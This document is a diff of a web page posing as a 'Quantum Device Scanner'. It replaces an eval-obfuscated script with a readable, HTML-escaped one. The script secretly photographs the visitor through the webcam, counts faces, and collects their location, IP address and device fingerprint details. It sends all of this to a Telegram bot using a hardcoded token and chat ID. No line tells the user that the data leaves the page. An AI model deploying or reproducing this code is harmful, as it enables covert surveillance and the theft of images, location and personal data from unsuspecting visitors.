@@ -1,33 +1,196 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Super AI Quantum Device Scanner</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
-  <style>
-    :root{--primary:#2ecc71;--secondary:#3498db;--hologram:rgba(46,204,113,0.2)}body{font-family:'Courier New',monospace;text-align:center;padding:20px;background:#0a0a0a;color:var(--primary);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background-image:radial-gradient(var(--hologram) 1px,transparent 1px),radial-gradient(var(--hologram) 1px,transparent 1px);background-size:50px 50px;background-position:0 0,25px 25px}.hologram-effect{position:fixed;width:200%;height:200%;background:linear-gradient(45deg,rgba(0,255,255,0.1) 25%,transparent 25%),linear-gradient(-45deg,rgba(255,0,255,0.1) 25%,transparent 25%),linear-gradient(45deg,transparent 75%,rgba(0,255,255,0.1) 75%),linear-gradient(-45deg,transparent 75%,rgba(255,0,255,0.1) 75%);background-size:20px 20px;pointer-events:none;mix-blend-mode:overlay;opacity:0.3;z-index:9999;animation:hologram 20s linear infinite}@keyframes hologram{from{transform:translate(-50%,-50%) rotate(0)}to{transform:translate(-50%,-50%) rotate(360deg)}}.scanner-box{position:relative;width:300px;height:300px;margin:0 auto;overflow:hidden}.scanner-box video{width:100%;height:100%;object-fit:cover}.scanner-line{position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(to right,transparent,var(--primary),transparent);animation:scanLine 3s linear infinite;z-index:2}@keyframes scanLine{0%{top:0}100%{top:100%}}
-  </style>
-</head>
-<body>
-  <h1 style="margin-bottom:20px;text-shadow:0 0 15px var(--primary)">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
-  <div class="scanner-box">
-    <div class="scanner-line"></div>
-    <video id="video" autoplay playsinline muted></video>
-  </div>
-  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
-  <div id="loading" style="display:none">🔭 CAPTURING QUANTUM SIGNATURE...</div>
-  <div id="device-info">
-    <h2>⚡ DEVICE MATRIX PROFILE</h2>
-    <div class="info-grid" id="device-info-content"></div>
-  </div>
 
-  <script>
-    // Encrypted JavaScript Code
-    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('9 8=\'6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ\';9 7=\'1121369247\';9 6=0;9 5=!1;9 4=a.g(\'h\');9 3=a.g(\'i\');b j(){9 2=a.k(\'l\');2.m=\'n\';o 2}b 1(c){9 d=a.k(\'e\');d.f=c.h;d.p=c.i;9 q=d.r(\'2d\');q.s(c,0,0);q.t=\'u\';q.v=\'w(90deg) x(150%)\';q.s(d,0,0);q.y=0.3;q.z=\'#A0B\';A(B=0;B<50;B++)q.C(D.E()*d.f,D.E()*d.p,D.E()*10,D.E()*10);o d.F(\'G\',0.8)}b H(I){9 J=K(I.L(\',\')[1]);9 M=I.L(\',\')[0].L(\':\')[1].L(\';\')[0];9 N=O P(J.Q);9 R=O U(N);A(V=0;V<J.Q;V++)R[V]=J.W(V);o O X([N],{Y:M})}b Z($){o(a.aa.ab($,4,O a.ac.ad()))[0].Q}b ae(){a.af.ag.ah(\'ai\')}b aj(){9 ak=a.g(\'al\');ak.am=\'an\';9 ao=a.g(\'ap\');aq(ar=0;ar<6.as;ar++)at(au(ar).av)}b aw(ax){9 ay=az.ba;9 bb=az.bc;9 bd=/Mobi|Android/i.be(ay)?\'bf\':\'bg\';9 bh="bi";bj(ay.bk("bl")!==-1)bh="bm";bn(/bo/.be(ay))bh="bp";bn(/bq/.be(ay))bh="br";bn(/bs/.be(ay))bh="bt";bn(/bu|bv|bw/.be(ay))bh="bx";9 by=/by/.be(ay)?"bz":/ca/.be(ay)?"cb":/cc/.be(ay)?"cd":"ce";9 cf=a.cg.ch().ci;9 cj=az.ck?az.ck+" cl":"cm";9 cn={co:"cm",cp:"cm"};bn(az.cq){cr{9 cs=az.cq();cn={co:cs.ct*100+\'%\',cp:cs.cu?"cv":"cw"}}cx(cy){}}9 cz="da";bj(ay.db("dc")>-1&&ay.db("dd")===-1)cz="de";bn(ay.db("df")>-1&&ay.db("dc")===-1)cz="dg";bn(ay.db("dh")>-1)cz="di";bn(ay.db("dd")>-1)cz="dj";bn(ay.db("dk")>-1)cz="dl";9 dm="dn";cr{9 do=a.dp(\'dq://dr.ds.dt/du?dv=dw\');dm=(dx do.dy()).dz}cx(ea){};
-    // Decode and execute the rest of the code...
-    ',62,312,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||'.split('|'),0,{}))
-  </script>
-</body>
-</html>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Super AI Quantum Device Scanner&lt;/title&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;
+  &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;
+  &lt;script defer src=&quot;https://cdn.jsdelivr.net/npm/face-api.js&quot;&gt;&lt;/script&gt;
+  &lt;style&gt;
+    :root {
+      --primary: #2ecc71;
+      --secondary: #3498db;
+      --hologram: rgba(46, 204, 113, 0.2);
+    }
+    body { 
+      font-family: &#39;Courier New&#39;, monospace;
+      text-align: center; 
+      padding: 20px; 
+      background: #0a0a0a;
+      color: var(--primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-image: radial-gradient(var(--hologram) 1px, transparent 1px), radial-gradient(var(--hologram) 1px, transparent 1px);
+      background-size: 50px 50px;
+      background-position: 0 0, 25px 25px;
+    }
+    .hologram-effect {
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
+      background-size: 20px 20px;
+      pointer-events: none;
+      mix-blend-mode: overlay;
+      opacity: 0.3;
+      z-index: 9999;
+      animation: hologram 20s linear infinite;
+    }
+    @keyframes hologram {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    .scanner-box { position: relative; width: 300px; height: 300px; margin: 0 auto; overflow: hidden; }
+    .scanner-box video { width: 100%; height: 100%; object-fit: cover; }
+    .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to right, transparent, var(--primary), transparent); animation: scanLine 3s linear infinite; z-index: 2; }
+    @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1 style=&quot;margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);&quot;&gt;🛸 QUANTUM DEVICE SCANNER v3.0&lt;/h1&gt;
+  &lt;div class=&quot;scanner-box&quot;&gt;
+    &lt;div class=&quot;scanner-line&quot;&gt;&lt;/div&gt;
+    &lt;video id=&quot;video&quot; autoplay playsinline muted&gt;&lt;/video&gt;
+  &lt;/div&gt;
+  &lt;button id=&quot;capture-btn&quot;&gt;🚀 INITIATE DEEP SCAN&lt;/button&gt;
+  &lt;div id=&quot;loading&quot; style=&quot;display:none;&quot;&gt;🔭 CAPTURING QUANTUM SIGNATURE...&lt;/div&gt;
+  &lt;div id=&quot;device-info&quot;&gt;
+    &lt;h2&gt;⚡ DEVICE MATRIX PROFILE&lt;/h2&gt;
+    &lt;div class=&quot;info-grid&quot; id=&quot;device-info-content&quot;&gt;&lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;script&gt;
+    const BOT_TOKEN = &#39;6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ&#39;;
+    const CHAT_ID = &#39;1121369247&#39;;
+    let currentStream = null;
+    let isScanning = false;
+    const video = document.getElementById(&#39;video&#39;);
+    const loading = document.getElementById(&#39;loading&#39;);
+
+    function createHologramEffect() { const hologram = document.createElement(&#39;div&#39;); hologram.className = &#39;hologram-effect&#39;; return hologram; }
+
+    async function captureQuantumImage() {
+      const canvas = document.createElement(&#39;canvas&#39;);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext(&#39;2d&#39;);
+      ctx.drawImage(video, 0, 0);
+      ctx.globalCompositeOperation = &#39;lighter&#39;;
+      ctx.filter = &#39;hue-rotate(90deg) contrast(150%)&#39;;
+      ctx.drawImage(canvas, 0, 0);
+      ctx.globalAlpha = 0.3; ctx.fillStyle = &#39;#00ff88&#39;;
+      for(let i = 0; i &lt; 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
+      return canvas.toDataURL(&#39;image/webp&#39;, 0.8);
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(&#39;,&#39;)[1]);
+      const mimeString = dataURI.split(&#39;,&#39;)[0].split(&#39;:&#39;)[1].split(&#39;;&#39;)[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i &lt; byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+      return new Blob([ab], { type: mimeString });
+    }
+
+    async function detectFaceCount() { return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; }
+    async function loadFaceModel() { await faceapi.nets.tinyFaceDetector.loadFromUri(&#39;https://justadudewhohacks.github.io/face-api.js/models/&#39;); }
+
+    async function gatherDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const deviceType = /Mobi|Android/i.test(userAgent) ? &#39;Mobile&#39; : &#39;Desktop&#39;;
+      let os = &quot;Unknown OS&quot;;
+      if (userAgent.indexOf(&quot;Win&quot;) !== -1) os = &quot;Windows&quot;;
+      else if (/Mac/.test(userAgent)) os = &quot;MacOS&quot;;
+      else if (/Linux/.test(userAgent)) os = &quot;Linux&quot;;
+      else if (/Android/.test(userAgent)) os = &quot;Android&quot;;
+      else if (/iPhone|iPad|iPod/.test(userAgent)) os = &quot;iOS&quot;;
+      let deviceModel = /iPhone/.test(userAgent) ? &quot;iPhone&quot; : /iPad/.test(userAgent) ? &quot;iPad&quot; : /Android/.test(userAgent) ? &quot;Android Device&quot; : &quot;Desktop&quot;;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const memory = navigator.deviceMemory ? navigator.deviceMemory + &quot; GB&quot; : &quot;N/A&quot;;
+      let batteryInfo = { level: &quot;N/A&quot;, charging: &quot;N/A&quot; };
+      if (navigator.getBattery) { try { const battery = await navigator.getBattery(); batteryInfo = { level: Math.round(battery.level*100)+&#39;%&#39;, charging: battery.charging?&quot;Yes&quot;:&quot;No&quot; }; } catch(e){} }
+      let browser = &quot;Unknown&quot;;
+      if (userAgent.indexOf(&quot;Chrome&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;Edg&quot;) === -1) browser = &quot;Chrome&quot;;
+      else if (userAgent.indexOf(&quot;Safari&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;Chrome&quot;) === -1) browser = &quot;Safari&quot;;
+      else if (userAgent.indexOf(&quot;Firefox&quot;) &gt; -1) browser = &quot;Firefox&quot;;
+      else if (userAgent.indexOf(&quot;Edg&quot;) &gt; -1) browser = &quot;Edge&quot;;
+      else if (userAgent.indexOf(&quot;OPR&quot;) &gt; -1) browser = &quot;Opera&quot;;
+      let ip = &quot;Unknown&quot;; try { const res = await fetch(&#39;https://api.ipify.org?format=json&#39;); ip = (await res.json()).ip; } catch(e){}
+      const language = navigator.language;
+      const resolution = window.screen.width+&quot;x&quot;+window.screen.height;
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const provider = connection ? (connection.effectiveType || connection.type || &quot;Unknown&quot;) : &quot;Unknown&quot;;
+      const pixelRatio = window.devicePixelRatio || 1;
+      const orientation = window.screen.orientation? window.screen.orientation.type : &quot;Unknown&quot;;
+
+      // Tambahan Fitur 🔥
+      // GPU Info
+      let gpuInfo = &quot;Unknown&quot;;
+      try { const gl = document.createElement(&#39;canvas&#39;).getContext(&#39;webgl&#39;); const dbg = gl.getExtension(&#39;WEBGL_debug_renderer_info&#39;); if(dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch(e){}
+      // Audio Devices
+      let audioDevices = [];
+      try { const devices = await navigator.mediaDevices.enumerateDevices(); audioDevices = devices.filter(d=&gt;d.kind.includes(&quot;audio&quot;)); } catch(e){}
+      // Local Storage &amp; Cookies
+      let storageEstimate = &quot;N/A&quot;;
+      try { const est = await navigator.storage.estimate(); storageEstimate = `${(est.quota/1024/1024).toFixed(2)} MB`; } catch(e){}
+      const cookiesEnabled = navigator.cookieEnabled ? &quot;Yes&quot;:&quot;No&quot;;
+      // Network Speed Test
+      let netSpeed = &quot;N/A&quot;;
+      try { const start=performance.now(); await fetch(&quot;https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png&quot;); const end=performance.now(); netSpeed=((92*30*4/1024)/((end-start)/1000)).toFixed(2)+&quot; KB/s&quot;; } catch(e){}
+      // Sensors (gyroscope/orientation)
+      let orientationData = &quot;N/A&quot;;
+      window.addEventListener(&#39;deviceorientation&#39;, (event)=&gt;{ orientationData = `Alpha:${event.alpha}, Beta:${event.beta}, Gamma:${event.gamma}`; }, {once:true});
+
+      return {userAgent,platform,deviceType,os,deviceModel,timeZone,memory,battery:batteryInfo,browser,ip,language,resolution,provider,pixelRatio,orientation,gpuInfo,audioDevices:audioDevices.map(d=&gt;d.label||d.kind),storageEstimate,cookiesEnabled,netSpeed,orientationData};
+    }
+
+    function generateHologramReport(imageData, location, deviceInfo) { return { image:imageData, metadata:{location,deviceInfo} }; }
+
+    function sendToTelegram(report) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append(&#39;chat_id&#39;, CHAT_ID);
+      formData.append(&#39;photo&#39;, dataURItoBlob(report.image), &#39;quantum_image.webp&#39;);
+      const d=report.metadata.deviceInfo;
+      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider} (${d.netSpeed})\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices.join(&quot;, &quot;)}\n📂 *Storage Quota:* ${d.storageEstimate}\n🍪 *Cookies Enabled:* ${d.cookiesEnabled}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n📳 *Orientation Sensor:* ${d.orientationData}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
+      formData.append(&#39;caption&#39;, caption);
+      formData.append(&#39;parse_mode&#39;, &#39;Markdown&#39;);
+      fetch(url,{method:&#39;POST&#39;,body:formData});
+    }
+
+    async function initCamera() {
+      try {
+        const isMobile=/Mobi|Android/i.test(navigator.userAgent);
+        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:isMobile?&quot;user&quot;:&quot;environment&quot;}});
+        video.srcObject=stream; currentStream=stream; document.body.appendChild(createHologramEffect()); loadFaceModel();
+      } catch(err){ alert(&#39;Error accessing camera: &#39;+err.message); }
+    }
+
+    async function startQuantumScan() {
+      if(isScanning) return; isScanning=true; loading.style.display=&#39;block&#39;;
+      const imageData=await captureQuantumImage();
+      let deviceInfo=await gatherDeviceInfo();
+      try{ deviceInfo.faceCount=await detectFaceCount(); }catch(e){ deviceInfo.faceCount=&quot;N/A&quot;; }
+      let locationData={coordinates:&#39;Unknown&#39;,link:&#39;Unknown&#39;};
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((pos)=&gt;{
+          locationData={coordinates:`${pos.coords.latitude},${pos.coords.longitude}`,link:`https://www.google.com/maps/search/?api=1&amp;query=${pos.coords.latitude},${pos.coords.longitude}`};
+          const report=generateHologramReport(imageData,locationData,deviceInfo);
+          sendToTelegram(report);
+          if(navigator.vibrate) navigator.vibrate(300);
+        },()=&gt;{ const report=generateHologramReport(imageData,locationData,deviceInfo); sendToTelegram(report); });
+      } else { const report=generateHologramReport(imageData,locationData,deviceInfo); sendToTelegram(report); }
+      loading.style.display=&#39;none&#39;; isScanning=false;
+    }
+
+    if(navigator.mediaDevices){ initCamera(); document.getElementById(&#39;capture-btn&#39;).onclick=startQuantumScan; }
+    function stopCamera(){ if(currentStream) currentStream.getTracks().forEach(t=&gt;t.stop()); }
+    window.addEventListener(&#39;beforeunload&#39;, stopCamera);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
